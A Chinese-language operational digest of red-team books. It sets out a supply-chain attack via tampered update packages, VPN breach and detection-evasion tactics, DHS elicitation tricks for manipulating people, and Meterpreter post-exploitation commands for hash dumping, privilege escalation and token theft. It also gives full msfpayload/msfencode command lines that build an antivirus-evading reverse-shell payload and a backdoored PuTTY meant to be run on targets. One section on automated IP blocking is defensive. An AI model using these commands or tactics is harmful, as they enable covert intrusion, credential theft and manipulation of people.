## I — 方法论骨架 (Interpretation)

**供应链定点攻击完整路径** — 当目标企业自身防护严密但 IT 系统靠外部采购/外包时，蓝队通过五步供应链攻击：①全网用关键词（"验收/驻场/运维"）排查供应商 ②找供应商内部系统（如即时通信软件后台）的已知漏洞 ③从聊天记录中定位驻场人员（关键字"目标企业名/OA/运维"+登录 IP 落在目标专属网段）④对驻场人员终端通过中间人攻击篡改升级包（利用供应商软件升级包合法性校验设计缺陷）⑤以驻场运维机为跳板横向移动，最终夺域控。被域控隔离后还能找终端安全管理系统新 0Day 反向夺权。

**VPN 攻击战术与目标确认方法** — 攻陷 VPN 是直捣黄龙的路径，长亭总结为"先确定目标 → 再突破 → 按成果分两类（用户权限级 vs 服务器权限级）"。确定目标有五种方法：Web 指纹（特征 URL/字符）、二级域名爆破、Fofa 等空间搜索引擎关键词搜索、目标单位泄漏的《VPN 连接说明》文档、VPN 域名历史 IP 解析记录。突破后用户权限级（拿到账号密码登录）可进内网但权限有限；服务器权限级（通过 VPN 漏洞或溢出/命令注入拿服务器权限）可拿数据库（含内网资产信息表、用户账号密码），后续深入利用空间更大。

**隐蔽行踪与防护绕过技巧清单** — 长亭总结攻击方隐蔽行踪的 6 类技巧：①WAF 绕过（语法/协议变形）②HIDS/EDR 绕过（优先无文件内存马）③藏匿流量（加密信道+端口复用）④横向扩展利用历史登录信息 ⑤混淆先行（工具代码混淆+免杀，CS/Mimikatz 等）⑥维持权限用合法工具（PsExec/哈希传递/运维平台下发命令）。核心思想是"避免触发告警 + 触发了也被当作正常业务"。

**自动化封禁脚本实现方式** — 攻防演练后期"火力全开"时人工封禁跟不上，需自动化：SIEM/SOC 平台聚合 WAF+全流量设备日志 → 按规则判定恶意 IP → 自动同步到防火墙封禁 → 因防火墙可封禁 IP 数量有限，定期清理旧封禁再重封。配套关注重点：①将 WAF/WebIDS/邮件沙箱/IPS/全流量/HIDS/EDR 等多源日志接入 ELK/splunk/日志易 ②优化接入设备告警准确性，针对性加监控规则（VPN 登录失败/SQL 注入/反序列化等）③联动防火墙/CDN/账户系统自动封禁（确保能拿到真实 IP）④对误报误封事件持续运营优化。

**DHS 诱导六场景套路集** — 作者引用美国国土安全部内部小册子，归纳出六个高命中率诱导套路：唤醒自我（吹捧让人说出本不该说的成就细节）；共同兴趣（提供"有用软件"换长期通信渠道）；故意说错（人类天性纠正错误，借机套出真实数据）；主动提供信息（触发回报义务）；假装高深（用别人的观点当自己的，建立专家假象后让对方主动透露经营理念）；酒精（酒后话多，洛斯阿拉莫斯科学家案）。六个套路可单独使用，也可叠加。

**Meterpreter 后渗透关键命令集** — Meterpreter 是 Metasploit 的后渗透"瑞士军刀"，作者把最常用命令归纳成一条标准链路：screenshot（看桌面是否有杀毒软件）→ sysinfo（确认操作系统版本）→ ps + migrate（迁移到稳定进程避免会话丢失）→ hashdump（提取 SAM 密码哈希）→ use priv + getsystem（提权到 SYSTEM）→ getuid（确认权限）→ steal_token/incognito（假冒域管理员令牌）。这条链路覆盖"侦察→稳定→提权→横向"四件事，是内网渗透的标准起手式。

**免杀多重编码 + 自定义可执行文件模板流水线** — 杀毒软件主要靠特征码识别恶意代码，单一编码器容易被特征库覆盖。Metasploit 的免杀分两层叠加：①**多重编码**——通过管道串联多个编码器对 payload 多次编码（shikata_ga_nai 多态、alpha_upper 字母大写、countdown 单字节 XOR 倒数），17 次编码后生成的 payload 与原始特征码完全不匹配；②**自定义模板**——默认 `template.exe` 是杀毒厂商重点特征对象，用 `-x` 指定合法 Windows 可执行文件（Process Explorer/PuTTY）作为宿主模板，配合 `-k` 让 payload 在独立线程中运行，目标运行看似正常的 PuTTY 时 payload 在后台静默执行。两层叠加实现"特征码打乱 + 行为伪装"的双重免杀。

- **方法论的使用**: 杀毒软件主要靠特征码识别恶意代码，单一编码器容易被特征库覆盖。Metasploit 的免杀分两层叠加：①**多重编码**——通过管道串联多个编码器对 payload 多次编码（shikata_ga_nai 多态、alpha_upper 字母大写、countdown 单字节 XOR 倒数），17 次编码后生成的 payload 与原始特征码完全不匹配；②**自定义模板**——默认 `template.exe` 是杀毒厂商重点特征对象，用 `-x` 指定合法 Windows 可执行文件（Process Explorer/PuTTY）作为宿主模板，配合 `-k` 让 payload 在独立线程中运行，目标运行看似正常的 PuTTY 时 payload 在后台静默执行。两层叠加实现"特征码打乱 + 行为伪装"的双重免杀。
- **结果**: 【亲历】第 7 章示例——17 次编码后 payload3.exe 成功躲避 AVG 检测（Page 130-131）；PuTTY 后门运行后 AVG 未检测出，且 PuTTY 正常运行（Page 133-134）。

## E — 执行步骤 (Execution)

### 供应链定点攻击完整路径

1. 关键词全网排查目标企业的供应商 → 锁定有驻场服务的 A 公司
  2. 找 A 公司内部系统（即时通信软件后台等）已知漏洞 → 拿服务器权限 + 数据库 → 拿管理员账号
  3. 检索聊天记录关键字（目标企业名/OA/运维）+ 登录 IP 段匹配 → 锁定 3 名驻场人员
  4. 深入分析软件升级包合法性校验机制缺陷 → 中间人攻击篡改升级包 → 驻场人员无感知安装恶意升级包
  5. 以驻场运维机为跳板横向移动 → 找终端安全管理系统 0Day → 控制全网终端

### VPN 攻击战术与目标确认方法

1. 确定目标 VPN：Web 指纹识别 + 二级域名爆破 + Fofa 关键词搜索 + 泄漏文档查找 + 历史 IP 解析
  2. 突破边界：
     - 用户权限级：信息收集员工账号 + 弱口令字典爆破 + 默认口令 + GitHub/网盘泄露密码 + 钓鱼骗取账号 + 接口越权任意创建用户
     - 服务器权限级：已知 VPN 漏洞或寻找溢出/命令注入
  3. 服务器权限级后续：拖数据库找内网资产信息 + 建 Socks 代理深度后门 + 横向扩展

### 隐蔽行踪与防护绕过技巧清单

1. WAF 绕过：语法变形 + 协议变形 + 分块传输
  2. HIDS/EDR 绕过：优先无文件内存马 + 进程注入
  3. 流量藏匿：加密信道（HTTPS DNS over HTTPS）+ 端口复用（443/3389/22 共用）
  4. 横向扩展：用本机历史登录信息、RDP/SSH 历史找下一跳
  5. 工具混淆：CS、Mimikatz 等做代码混淆 + 免杀处理
  6. 维持权限：用 PsExec、哈希传递、运维平台下发命令等合法方式

### 自动化封禁脚本实现方式

1. 搭建 SIEM/SOC 平台（ELK/splunk/日志易）
  2. 接入 WAF、WebIDS、邮件沙箱、IPS、全流量、HIDS、EDR 等设备日志
  3. 优化接入设备告警准确性，加监控规则（VPN 登录失败、SQL 注入、反序列化、登录失败事件）
  4. 制定自动封禁规则，联动防火墙/CDN/账户系统
  5. 确保前置设备能拿到真实 IP（避免封到 CDN IP、前置设备 IP、伪造 IP）
  6. 定期清理旧 IP 封禁记录，重新封禁（防火墙 IP 容量有限）
  7. 对误报误封事件持续运营优化

### DHS 诱导六场景套路集

1. 唤醒自我：微妙吹捧（"某某认为你很厉害"）→ 目标为维持形象主动展开细节
  2. 共同兴趣：先提供有价值的信息/软件 → 建立长期通信渠道
  3. 故意说错：陈述一个与目标领域相关的错误事实 → 目标本能纠正，套出真实数据
  4. 主动提供：先说一条八卦（"听说露丝被辞退了"）→ 触发对方回报同类信息
  5. 假装高深：借他人观点开场建立专家身份 → 让对方主动透露经营哲学
  6. 酒精加持：在鸡尾酒会场景下叠加以上五招 → 效果放大 10 倍

### Meterpreter 后渗透关键命令集

1. `screenshot` → 桌面截图，看是否有杀毒软件
  2. `sysinfo` → 操作系统版本/架构/语言
  3. `ps` + `migrate <explorer.exe PID>` → 迁移到稳定进程
  4. `run post/windows/gather/hashdump` → 提取密码哈希
  5. `use priv` + `getsystem` → 提权到 SYSTEM
  6. `getuid` → 确认当前权限
  7. `ps` 找域管理员进程 + `steal_token <PID>` → 假冒域管理员

### 免杀多重编码 + 自定义可执行文件模板流水线

1. 多重编码：`msfpayload windows/meterpreter/reverse_tcp LHOST=x LPORT=y R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5 -t exe -o payload.exe`（共 17 次编码）
  2. 自定义模板：`msfpayload windows/shell_reverse_tcp LHOST=x LPORT=y R | msfencode -t exe -x putty.exe -o putty_backdoor.exe -e x86/shikata_ga_nai -k -c 5`
  3. 用测试杀毒软件扫描确认
  4. 部署到目标 → 目标运行 putty_backdoor.exe 时 PuTTY 正常启动，payload 在后台反弹

## B — 失效与边界 (Boundary)

- **供应链定点攻击完整路径**：供应商软件升级包校验机制健全 → 中间人篡改失败；驻场人员终端有 EDR/杀毒 → 恶意升级包被拦截；只攻一家供应商若该供应商无驻场则全盘失败。
- **VPN 攻击战术与目标确认方法**：VPN 漏洞被防守方通过应急响应及时打补丁、下线特权账号、关停 → 路径被阻断；只拿到用户权限级无法横向 → 需配合其他漏洞。
- **隐蔽行踪与防护绕过技巧清单**：内存马仍可能被内存扫描发现；端口复用异常流量可能被全流量分析设备识别；合法工具使用频次异常会被 UEBA 发现。
- **自动化封禁脚本实现方式**：前置设备未获取真实 IP → 封到 CDN IP 或前置设备 IP 影响业务；自动封禁规则误报多 → 大量正常业务 IP 被封；防火墙封禁 IP 容量小且不定期清理 → 容量满后新攻击 IP 无法封禁。
- **DHS 诱导六场景套路集**：吹捧过度会立刻引起警觉；故意说错的事实太离谱，目标看穿后闭嘴；酒精用过头会让目标失忆或失态。
- **Meterpreter 后渗透关键命令集**：migrate 到即将关闭的进程会丢会话；getsystem 在配置严格的系统上可能失败；steal_token 需要域管理员登录过该机器；persistence 脚本必须测试后移除（详见 CU-2-26 反例）。
- **免杀多重编码 + 自定义可执行文件模板流水线**：编码次数过多会显著增大文件体积；某些杀毒软件用行为检测而非特征码，多重编码无效；免杀技术几个月内可能有重大变化，需持续测试；-k 选项不一定能用在所有可执行程序上；命令行程序作为宿主会在桌面显示窗口。
